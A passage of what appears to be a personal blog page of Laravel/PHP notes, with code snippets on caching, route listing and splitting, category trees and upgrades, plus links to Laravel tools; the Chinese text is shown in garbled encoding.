class="number">1</span>)-&gt;sql();</span><br><span class="line"></span><br><span class="line"><span class="comment">// é”™è¯¯ç”¨æ³•</span></span><br><span class="line">User::query()-&gt;where(<span class="string">'id'</span>, <span class="number">1</span>)-&gt;get()-&gt;sql();</span><br><span class="line">User::query()-&gt;where(<span class="string">'id'</span>, <span class="number">1</span>)-&gt;first()-&gt;sql();</span><br><span class="line">https:<span class="comment">//learnku.com/articles/33484</span></span><br></pre></td></tr></table></figure>
<h3 id="cache"><a href="#cache" class="headerlink" title="cache"></a>cache</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">use Illuminate\Support\Facades\Cache;</span><br><span class="line"></span><br><span class="line">Cache::get(<span class="string">'xxx'</span>);</span><br><span class="line">app(<span class="string">'Illuminate\Contracts\Cache\Factory'</span>)-&gt;get(<span class="string">'xxx'</span>);</span><br><span class="line">app(<span class="string">'Illuminate\Cache\CacheManager'</span>)-&gt;get(<span class="string">'xxx'</span>);</span><br><span class="line">app(<span class="string">'cache'</span>)-&gt;get(<span class="string">'xxx'</span>);</span><br><span class="line">app()[<span class="string">'cache'</span>]-&gt;get(<span class="string">'xxx'</span>);</span><br><span class="line">cache(<span class="string">'xxx'</span>);</span><br><span class="line">   <span class="function"><span class="keyword">function</span> <span class="title">cache</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $<span class="built_in">arguments</span> = func_get_args();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (empty($<span class="built_in">arguments</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> app(<span class="string">'cache'</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (is_string($<span class="built_in">arguments</span>[<span class="number">0</span>])) &#123;</span><br><span class="line">            <span class="keyword">return</span> app(<span class="string">'cache'</span>)-&gt;get(...$<span class="built_in">arguments</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (! is_array($<span class="built_in">arguments</span>[<span class="number">0</span>])) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> Exception(</span><br><span class="line">                <span class="string">'When setting a value in the cache, you must pass an array of key / value pairs.'</span></span><br><span class="line">            );</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (! isset($<span class="built_in">arguments</span>[<span class="number">1</span>])) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> Exception(</span><br><span class="line">                <span class="string">'You must specify an expiration time when setting a value in the cache.'</span></span><br><span class="line">            );</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> app(<span class="string">'cache'</span>)-&gt;put(key($<span class="built_in">arguments</span>[<span class="number">0</span>]), reset($<span class="built_in">arguments</span>[<span class="number">0</span>]), $<span class="built_in">arguments</span>[<span class="number">1</span>]);</span><br><span class="line">        https:<span class="comment">//learnku.com/articles/33628</span></span><br></pre></td></tr></table></figure>
<h3 id="Laravel-çš„è¯·æ±‚æ˜¯æ€ä¹ˆåˆ°è¾¾æ§åˆ¶å™¨"><a href="#Laravel-çš„è¯·æ±‚æ˜¯æ€ä¹ˆåˆ°è¾¾æ§åˆ¶å™¨" class="headerlink" title="Laravel çš„è¯·æ±‚æ˜¯æ€ä¹ˆåˆ°è¾¾æ§åˆ¶å™¨"></a>Laravel çš„è¯·æ±‚æ˜¯æ€ä¹ˆåˆ°è¾¾æ§åˆ¶å™¨</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h3 id="åˆ†ç±»åˆ—è¡¨æ— é™åˆ†ç±»"><a href="#åˆ†ç±»åˆ—è¡¨æ— é™åˆ†ç±»" class="headerlink" title="åˆ†ç±»åˆ—è¡¨æ— é™åˆ†ç±»"></a>åˆ†ç±»åˆ—è¡¨æ— é™åˆ†ç±»</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">public <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">getTree</span>(<span class="params">$data,$pId,$level = <span class="number">0</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">static</span> $list = [];</span><br><span class="line">        foreach ($data <span class="keyword">as</span> $key =&gt; $value)&#123;</span><br><span class="line">            <span class="comment">//ç¬¬ä¸€æ¬¡éå†,æ‰¾åˆ°çˆ¶èŠ‚ç‚¹ä¸ºæ ¹èŠ‚ç‚¹çš„èŠ‚ç‚¹ ä¹Ÿå°±æ˜¯pid=0çš„èŠ‚ç‚¹</span></span><br><span class="line">            <span class="keyword">if</span> ($value[<span class="string">'parent_id'</span>] == $pId)&#123;</span><br><span class="line">                <span class="comment">//çˆ¶èŠ‚ç‚¹ä¸ºæ ¹èŠ‚ç‚¹çš„èŠ‚ç‚¹,çº§åˆ«ä¸º0ï¼Œä¹Ÿå°±æ˜¯ç¬¬ä¸€çº§</span></span><br><span class="line">                $value[<span class="string">'level'</span>] = $level;</span><br><span class="line">                $value[<span class="string">'display_name'</span>] =$value[<span class="string">'displayname'</span>];</span><br><span class="line">                $value[<span class="string">'displayname'</span>] = str_repeat(<span class="string">'â”â”'</span>, $value[<span class="string">'level'</span>]).$value[<span class="string">'displayname'</span>];</span><br><span class="line"></span><br><span class="line">                <span class="comment">//æŠŠæ•°ç»„æ”¾åˆ°listä¸­</span></span><br><span class="line">                $list[] = $value;</span><br><span class="line">                <span class="comment">//æŠŠè¿™ä¸ªèŠ‚ç‚¹ä»æ•°ç»„ä¸­ç§»é™¤,å‡å°‘åç»­é€’å½’æ¶ˆè€—</span></span><br><span class="line">                unset($data[$key]);</span><br><span class="line">                <span class="comment">//å¼€å§‹é€’å½’,æŸ¥æ‰¾çˆ¶IDä¸ºè¯¥èŠ‚ç‚¹IDçš„èŠ‚ç‚¹,çº§åˆ«åˆ™ä¸ºåŸçº§åˆ«+1</span></span><br><span class="line">                self::getTree($data, $value[<span class="string">'id'</span>], $level+<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> $list;</span><br><span class="line">    &#125;</span><br><span class="line">ä¼˜é›…çš„æ ‘å½¢æ•°æ®ç»“æ„ç®¡ç†åŒ…,åŸºäºClosure Tableæ¨¡å¼è®¾è®¡. https:<span class="comment">//github.com/jiaxincui/closure-table</span></span><br></pre></td></tr></table></figure>
<h3 id="è·å–è·¯ç”±"><a href="#è·å–è·¯ç”±" class="headerlink" title="è·å–è·¯ç”±"></a>è·å–è·¯ç”±</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">$routeCollection = \Route::getRoutes();</span><br><span class="line"></span><br><span class="line">foreach ($routeCollection <span class="keyword">as</span> $value) &#123;</span><br><span class="line">    $routes[] = [$value-&gt;getPath(),$value-&gt;methods()[<span class="number">0</span>], $value-&gt;getActionName()];</span><br><span class="line">&#125;</span><br><span class="line">Route::get(<span class="string">'routes'</span>, <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    $routeCollection = Route::getRoutes();</span><br><span class="line"></span><br><span class="line">    echo <span class="string">"&lt;table style='width:100%'&gt;"</span>;</span><br><span class="line">        echo <span class="string">"&lt;tr&gt;"</span>;</span><br><span class="line">            echo <span class="string">"&lt;td width='10%'&gt;&lt;h4&gt;HTTP Method&lt;/h4&gt;&lt;/td&gt;"</span>;</span><br><span class="line">            echo <span class="string">"&lt;td width='10%'&gt;&lt;h4&gt;Route&lt;/h4&gt;&lt;/td&gt;"</span>;</span><br><span class="line">            echo <span class="string">"&lt;td width='10%'&gt;&lt;h4&gt;Name&lt;/h4&gt;&lt;/td&gt;"</span>;</span><br><span class="line">            echo <span class="string">"&lt;td width='70%'&gt;&lt;h4&gt;Corresponding Action&lt;/h4&gt;&lt;/td&gt;"</span>;</span><br><span class="line">        echo <span class="string">"&lt;/tr&gt;"</span>;</span><br><span class="line">        foreach ($routeCollection <span class="keyword">as</span> $value) &#123;</span><br><span class="line">            echo <span class="string">"&lt;tr&gt;"</span>;<span class="comment">//sina/vendor/laravel/framework/src/Illuminate/Routing/Route.php:919</span></span><br><span class="line">                echo <span class="string">"&lt;td&gt;"</span> . $value-&gt;getMethods()[<span class="number">0</span>] . <span class="string">"&lt;/td&gt;"</span>;</span><br><span class="line">                echo <span class="string">"&lt;td&gt;"</span> . $value-&gt;getPath() . <span class="string">"&lt;/td&gt;"</span>;</span><br><span class="line">                echo <span class="string">"&lt;td&gt;"</span> . $value-&gt;getName() . <span class="string">"&lt;/td&gt;"</span>;</span><br><span class="line">                echo <span class="string">"&lt;td&gt;"</span> . $value-&gt;getActionName() . <span class="string">"&lt;/td&gt;"</span>;</span><br><span class="line">            echo <span class="string">"&lt;/tr&gt;"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    echo <span class="string">"&lt;/table&gt;"</span>;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">https:<span class="comment">//stackoverflow.com/questions/18394891/how-to-get-a-list-of-registered-route-paths-in-laravel</span></span><br><span class="line">https:<span class="comment">//stackoverflow.com/questions/15955295/displaying-registered-routes-in-laravel</span></span><br><span class="line"></span><br><span class="line">php artisan route:list  sina/vendor/laravel/framework/src/Illuminate/Foundation/Console/RouteListCommand.php:<span class="number">14</span></span><br></pre></td></tr></table></figure>
<h3 id="è‡ªåŠ¨å°†ç©ºå­—ç¬¦ä¸²è½¬ä¸º-null"><a href="#è‡ªåŠ¨å°†ç©ºå­—ç¬¦ä¸²è½¬ä¸º-null" class="headerlink" title="è‡ªåŠ¨å°†ç©ºå­—ç¬¦ä¸²è½¬ä¸º null"></a>è‡ªåŠ¨å°†ç©ºå­—ç¬¦ä¸²è½¬ä¸º null</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">laravel æœ‰ä¸€ä¸ª ConvertEmptyStringsToNull ä¸­é—´ä»¶ï¼Œè‡ªåŠ¨å°†ç©ºå­—ç¬¦ä¸²è½¬ä¸º <span class="literal">null</span>ã€‚</span><br><span class="line">åœ¨ App\Http\Kernel.php ä¸­ï¼Œæ³¨é‡Šäº†è¿™ä¸ªä¸­é—´ä»¶å°±å¥½äº†ã€‚</span><br><span class="line"> QueryException In Connection.php line <span class="number">664</span> :</span><br><span class="line"> SQLSTATE[<span class="number">23000</span>]: Integrity constraint violation: <span class="number">1048</span> Column <span class="string">'judge_group'</span> cannot be <span class="literal">null</span></span><br><span class="line"> </span><br><span class="line"> æ‰“å°ä¸‹ Request è¿”å›çš„æ•°æ®ï¼ŒLaravel æœ‰ä¸ªä¸­é—´ä»¶ä¼šæŠŠ <span class="string">' '</span> è½¬ä¸º <span class="literal">null</span>ã€‚https:<span class="comment">//learnku.com/laravel/t/35052</span></span><br></pre></td></tr></table></figure>
<h3 id="Laravel-5-5-å‡çº§åˆ°-6-0"><a href="#Laravel-5-5-å‡çº§åˆ°-6-0" class="headerlink" title="Laravel 5.5 å‡çº§åˆ° 6.0"></a>Laravel 5.5 å‡çº§åˆ° 6.0</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">ä½¿ç”¨ phpredis æ›¿ä»£ predis</span><br><span class="line"></span><br><span class="line">Laravel å¼€å§‹æ¨èä½¿ç”¨ phpredis æ¥ä»£æ›¿ predisã€‚</span><br><span class="line"></span><br><span class="line">æ‰€ä»¥è¦è®°å¾—å…ˆå®‰è£… phpredis, ç„¶ååœ¨ config/app.php ä¸­å»æ‰ Redis åˆ«å</span><br><span class="line">https:<span class="comment">//learnku.com/articles/35056</span></span><br></pre></td></tr></table></figure>
<h3 id="API-å’Œ-åå°æ¥å£åˆ†ç¦»"><a href="#API-å’Œ-åå°æ¥å£åˆ†ç¦»" class="headerlink" title="API å’Œ åå°æ¥å£åˆ†ç¦»"></a>API å’Œ åå°æ¥å£åˆ†ç¦»</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line">å‘ç°è·¯ç”±æ•°é‡å˜å¤šåå½±å“åˆ°äº†æ€§èƒ½ï¼Œè¿™ä¸ªæ—¶å€™éœ€è¦åŒºåˆ«ä¸åŒæœåŠ¡å™¨å»åŠ è½½ä¸åŒçš„è·¯ç”±ã€‚</span><br><span class="line"></span><br><span class="line">å¦‚ä½•å»åˆ«ä¸åŒçš„æœåŠ¡å™¨åŒºåˆ«ç¯å¢ƒï¼Œä½†æ˜¯åˆè¦åŒºåˆ«æ˜¯ç”Ÿäº§ç¯å¢ƒã€‚</span><br><span class="line">å¯ä»¥ä½¿ç”¨ app()-&gt;environment(); æ–¹æ³•å®ç°ï¼Œç”Ÿäº§ç¯å¢ƒå’Œæµ‹è¯•ç¯å¢ƒçš„åŒºåˆ«ã€‚</span><br><span class="line"></span><br><span class="line">æŸ¥çœ‹ä»£ç åå‘ç°å¯ä»¥ä½¿ç”¨æ›´å¤šçš„æ–¹æ³•ã€‚</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * è·å–æˆ–æ£€æŸ¥å½“å‰åº”ç”¨ç¨‹åºç¯å¢ƒã€‚</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * @return string|bool</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">public <span class="function"><span class="keyword">function</span> <span class="title">environment</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// è¿”å›ä¼ é€’ç»™å‡½æ•°çš„å‚æ•°æ•°é‡</span></span><br><span class="line">    <span class="keyword">if</span> (func_num_args() &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="comment">// å¦‚æœç¬¬ä¸€ä¸ªå‚æ•°æ˜¯æ•°ç»„å°±å»ç¬¬ä¸€ä¸ªï¼Œä¸æ˜¯çš„è¯å–å…¨éƒ¨çš„ã€‚</span></span><br><span class="line">        $patterns = is_array(func_get_arg(<span class="number">0</span>)) ? func_get_arg(<span class="number">0</span>) : func_get_args();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> Str::is($patterns, $<span class="keyword">this</span>[<span class="string">'env'</span>]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> $<span class="keyword">this</span>[<span class="string">'env'</span>];</span><br><span class="line">&#125;</span><br><span class="line">Str::is å‡½æ•°åˆ¤æ–­ç»™å®šçš„å­—ç¬¦ä¸²æ˜¯å¦åŒ¹é…ç»™å®šçš„æ¨¡å¼ã€‚æ˜Ÿå· * å¯ä»¥ç”¨æ¥è¡¨ç¤ºé€šé…ç¬¦ï¼š</span><br><span class="line"></span><br><span class="line"># åˆ¤æ–­åœ¨ API ç¯å¢ƒ</span><br><span class="line">app()-&gt;environment(<span class="string">"production.api"</span>);</span><br><span class="line"># åˆ¤æ–­åœ¨ ADMIN ç¯å¢ƒ</span><br><span class="line">app()-&gt;environment(<span class="string">"production.admin"</span>);</span><br><span class="line"># åˆ¤æ–­åœ¨æ‰€æœ‰ç¯å¢ƒ</span><br><span class="line">app()-&gt;environment(<span class="string">"production.*"</span>);</span><br><span class="line">ä¿®æ”¹ RouteServiceProvider æ–‡ä»¶</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Define the routes for the application.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">public <span class="function"><span class="keyword">function</span> <span class="title">map</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// å…¬å…±è·¯ç”±</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (app()-&gt;environment(<span class="string">'production.api'</span>)) &#123;</span><br><span class="line">        # production api è·¯ç”±</span><br><span class="line">        $<span class="keyword">this</span>-&gt;mapApiRoutes();</span><br><span class="line">    &#125; elseif (app()-&gt;environment(<span class="string">'production.admin'</span>)) &#123;</span><br><span class="line">        # production admin è·¯ç”±</span><br><span class="line">        $<span class="keyword">this</span>-&gt;mapAdminRoutes();</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        # local testing stanging ç¯å¢ƒä¸‹åŠ è½½æ‰€æœ‰è·¯ç”±</span><br><span class="line">        $<span class="keyword">this</span>-&gt;mapApiRoutes();</span><br><span class="line"></span><br><span class="line">        $<span class="keyword">this</span>-&gt;mapAdminRoutes();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">https:<span class="comment">//learnku.com/articles/35099</span></span><br></pre></td></tr></table></figure>
<h3 id="laravelè·¯ç”±åˆ†å‰²"><a href="#laravelè·¯ç”±åˆ†å‰²" class="headerlink" title="laravelè·¯ç”±åˆ†å‰²"></a>laravelè·¯ç”±åˆ†å‰²</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line">Route::group([<span class="string">'middleware'</span> =&gt; [<span class="string">'web'</span>]], <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    Route::group([<span class="string">'prefix'</span> =&gt; <span class="string">'user'</span>, <span class="string">'namespace'</span> =&gt; <span class="string">'User'</span>], <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="built_in">require</span> app_path(<span class="string">'Http/Routes/user.php'</span>);</span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line">    Route::group([<span class="string">'prefix'</span> =&gt; <span class="string">'admin'</span>, <span class="string">'namespace'</span> =&gt; <span class="string">'Admin'</span>], <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="built_in">require</span> app_path(<span class="string">'Http/Routes/admin.php'</span>);</span><br><span class="line">    &#125;);</span><br><span class="line">    Route::group([<span class="string">'prefix'</span> =&gt; <span class="string">'api'</span>, <span class="string">'namespace'</span> =&gt; <span class="string">'Home'</span>], <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="built_in">require</span> app_path(<span class="string">'Http/Routes/homeapi.php'</span>);</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;);</span><br><span class="line">app/Providers/RouteServiceProvider.php çš„ map æ–¹æ³•ä¸­å¯ä»¥å¦‚ä¸‹å®šä¹‰ï¼š</span><br><span class="line">public <span class="function"><span class="keyword">function</span> <span class="title">map</span>(<span class="params">Router $router</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $router-&gt;group([<span class="string">'namespace'</span> =&gt; $<span class="keyword">this</span>-&gt;namespace], <span class="function"><span class="keyword">function</span> (<span class="params">$router</span>) </span>&#123;</span><br><span class="line">        <span class="comment">//require app_path('Http/routes.php');</span></span><br><span class="line">        foreach (glob(app_path(<span class="string">'Http//Routes'</span>) . <span class="string">'/*.php'</span>) <span class="keyword">as</span> $file) &#123;</span><br><span class="line">            $<span class="keyword">this</span>-&gt;app-&gt;make(<span class="string">'App\\Http\\Routes\\'</span> . basename($file, <span class="string">'.php'</span>))-&gt;map($router);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br><span class="line">https:<span class="comment">//learnku.com/laravel/t/2484/the-best-way-to-split-routesphp-laravel-routing-file</span></span><br><span class="line">php artisan route:cache</span><br><span class="line"></span><br><span class="line">   public <span class="function"><span class="keyword">function</span> <span class="title">map</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $<span class="keyword">this</span>-&gt;mapWebRoutes();</span><br><span class="line">        $<span class="keyword">this</span>-&gt;mapApiRoutes();</span><br><span class="line">        <span class="comment">//</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    protected <span class="function"><span class="keyword">function</span> <span class="title">mapWebRoutes</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        Route::group([</span><br><span class="line">            <span class="string">'middleware'</span> =&gt; <span class="string">'web'</span>,</span><br><span class="line">            <span class="string">'namespace'</span> =&gt; $<span class="keyword">this</span>-&gt;namespace,</span><br><span class="line">        ], <span class="function"><span class="keyword">function</span> (<span class="params">$router</span>) </span>&#123;</span><br><span class="line">            <span class="built_in">require</span> base_path(<span class="string">'routes/web.php'</span>);</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    protected <span class="function"><span class="keyword">function</span> <span class="title">mapApiRoutes</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        Route::group([</span><br><span class="line">            <span class="string">'middleware'</span> =&gt; [<span class="string">'api'</span>, <span class="string">'auth:api'</span>],</span><br><span class="line">            <span class="string">'namespace'</span> =&gt; $<span class="keyword">this</span>-&gt;namespace,</span><br><span class="line">            <span class="string">'prefix'</span> =&gt; <span class="string">'api'</span>,</span><br><span class="line">        ], <span class="function"><span class="keyword">function</span> (<span class="params">$router</span>) </span>&#123;</span><br><span class="line">            <span class="built_in">require</span> base_path(<span class="string">'routes/api.php'</span>);</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">http:<span class="comment">//www.xiaot123.com/post/laravel_route</span></span><br><span class="line"></span><br><span class="line">æŒ‰ç…§URL</span><br><span class="line"><span class="keyword">if</span> (Str::is(<span class="string">'api.*'</span>, request()-&gt;server(<span class="string">'HTTP_HOST'</span>) ?? <span class="string">''</span>)) &#123;</span><br><span class="line">      $<span class="keyword">this</span>-&gt;mapApiRoutes();</span><br><span class="line">&#125; elseif (Str::is(<span class="string">'admin.*'</span>, request()-&gt;server(<span class="string">'HTTP_HOST'</span>) ?? <span class="string">''</span>)) &#123;</span><br><span class="line">      $<span class="keyword">this</span>-&gt;mapAdminRoutes();</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      $<span class="keyword">this</span>-&gt;mapApiRoutes();</span><br><span class="line"></span><br><span class="line">      $<span class="keyword">this</span>-&gt;mapAdminRoutes();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><a href="https://github.com/AlexStack/Laravel-CMS" target="_blank" rel="noopener">Laravel é¡¹ç›®çš„ç®€å• CMS</a></p>
<p><a href="https://learnku.com/docs/the-laravel-way/5.6/Tao-1-1/2925" target="_blank" rel="noopener">Laravel ä¹‹é“</a></p>
<p>Laravel ä»£ç ç”Ÿæˆå™¨ <a href="https://learnku.com/laravel/t/34772" target="_blank" rel="noopener">https://learnku.com/laravel/t/34772</a> <a href="https://github.com/GooGee/Entity-Builder" target="_blank" rel="noopener">https://github.com/GooGee/Entity-Builder</a></p>
<p><a href="https://github.com/yanlongma/docker-lnmp" target="_blank" rel="noopener">ä½¿ç”¨ Docker LNMP éƒ¨ç½² PHP å¼€å‘ç¯å¢ƒ </a></p>
<p><a href="https://learnku.com/laravel/t/34780" target="_blank" rel="noopener">PHP-fpm MongoDB è¿æ¥æ•° </a></p>
<p><a href="https://github.com/sheaxiang/shea" target="_blank" rel="noopener"> Laravel æºç å†™çš„ä¸€ä¸ªç®€æ˜“æ¡†æ¶</a></p>
<p><a href="https://learnku.com/articles/34628" target="_blank" rel="noopener">è½»æ¾éƒ¨ç½² Laravel åº”ç”¨ </a></p>
<p>æ¥è¿‘å…è´¹çš„ SSL è¯ä¹¦ <a href="https://www.digital-sign.com.cn/register" target="_blank" rel="noopener">https://www.digital-sign.com.cn/register</a></p>
<p>ä¸€é”®ç”Ÿæˆ https æ ¹åŸŸåè¯ä¹¦æ›´æ–¹ä¾¿ï¼Œæ¨è certbot-auto è„šæœ¬</p>
<p><a href="https://github.com/mylxsw/wizard" target="_blank" rel="noopener">Laravel çš„å¼€æºapiæ–‡æ¡£ç®¡ç†ç³»ç»Ÿ Wizard </a></p>
<p><a href="https://learnku.com/articles/34879" target="_blank" rel="noopener">CentOS7 è½»æ¾éƒ¨ç½² Laravel åº”ç”¨</a></p>
<p><a href="https://github.com/peinhu/aetherupload-laravel" target="_blank" rel="noopener">è¶…å¤§æ–‡ä»¶ä¸Šä¼ </a></p>
<p><a href="https://learnku.com/articles/34568" target="_blank" rel="noopener">ä½¿ç”¨ AetherUpload è§†é¢‘ä¸Šä¼ è¿‡ç¨‹</a></p>
<p><a href="https://github.com/kphcdr/axeadmin-laravel" target="_blank" rel="noopener">axeadmin è®©ä½ çš„ Laravel å¿«é€Ÿæ‹¥æœ‰ä¸€ä¸ªåå°</a></p>
<p><a href="https://learnku.com/articles/34123" target="_blank" rel="noopener">Laravel çš„è¯·æ±‚æ˜¯æ€ä¹ˆåˆ°è¾¾æ§åˆ¶å™¨</a></p>
